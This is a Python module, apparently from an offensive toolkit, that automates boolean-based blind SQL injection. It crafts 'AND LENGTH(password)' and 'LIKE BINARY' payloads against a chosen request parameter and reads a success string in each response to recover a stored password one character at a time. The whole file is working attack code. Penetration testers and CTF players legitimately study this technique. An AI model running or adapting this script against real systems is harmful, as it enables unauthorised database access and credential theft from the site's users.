import string
from modules.utils import make_request


def _get_password_length(target_url, auth, data, param_to_fuzz, success_string, max_len):
    """
    Determines the length of the password using boolean-based blind SQL injection.

    It iterates from 1 to max_len, asking the database a true/false question:
    "Is the length of the password equal to X?".

    :param target_url: The URL to send the request to.
    :param auth: A tuple for basic authentication (username, password).
    :param data: A dictionary containing the request data (e.g., POST body).
    :param param_to_fuzz: The key in the 'data' dictionary that is vulnerable to injection.
    :param success_string: The string to look for in the response that indicates a TRUE condition.
    :param max_len: The maximum password length to test for.
    """
    print("[+] Stage 1: Determining password length...")
    base_value = data[param_to_fuzz]  # The original, non-malicious value of the parameter.

    for length in range(1, max_len + 1):
        print(f"    [-] Checking for length: {length}")
        payload = f'{base_value}" AND LENGTH(password) = {length} -- -'
        payload_data = data.copy()
        payload_data[param_to_fuzz] = payload

        response = make_request(target_url, auth=auth, data=payload_data)

        if response and success_string in response.text:
            print(f"\n[!] SUCCESS: Password length is exactly {length} characters.")
            return length

    print(f"\n[-] FAILED: Could not determine password length up to the max of {max_len}.")
    return 0


def probe_blind_sql_boolean_generic(target_url, auth, data, param_to_fuzz, success_string, max_len=32):
    """
    Performs a generic, two-stage boolean-based blind SQL injection to exfiltrate a password.

    :param target_url: The URL to send the request to.
    :param auth: A tuple for basic authentication (username, password).
    :param data: A dictionary containing the request data (e.g., POST body).
    :param param_to_fuzz: The key in the 'data' dictionary that is vulnerable to injection.
    :param success_string: The string in the response that indicates a TRUE condition.
    :param max_len: The maximum password length to test for.
    """
    if param_to_fuzz not in data:
        print(f"\n[-] ERROR: The parameter to fuzz '{param_to_fuzz}' is not in the provided data dictionary.")
        return

    # --- 1. Get Length ---
    discovered_length = _get_password_length(target_url, auth, data, param_to_fuzz, success_string, max_len)
    if not discovered_length:
        print("[-] Halting scan because password length could not be determined.")
        return

    # --- 2. Exfiltrate Password ---
    print("\n[+] Stage 2: Exfiltrating password characters...")
    base_value = data[param_to_fuzz]
    CHARSET = string.ascii_letters + string.digits
    password = ""

    # Loop through each position of the password.
    for i in range(discovered_length):
        found_char_in_iteration = False
        for char in CHARSET:
            payload = f'{base_value}" AND password LIKE BINARY "{password + char}%" -- -'
            payload_data = data.copy()
            payload_data[param_to_fuzz] = payload
            response = make_request(target_url, auth=auth, data=payload_data)

            if response and success_string in response.text:
                password += char
                print(f"[+] Found character: '{char}' -> Password so far: {password}")
                found_char_in_iteration = True
                break

        if not found_char_in_iteration:
            print(f"\n[-] FAILED to find character at position {len(password) + 1}.")
            break

    if len(password) == discovered_length:
        print(f"\n[!] SUCCESS: Full Password Extracted: {password}")
    else:
        print(f"\n[-] FAILED: Could only extract a partial password: {password}")
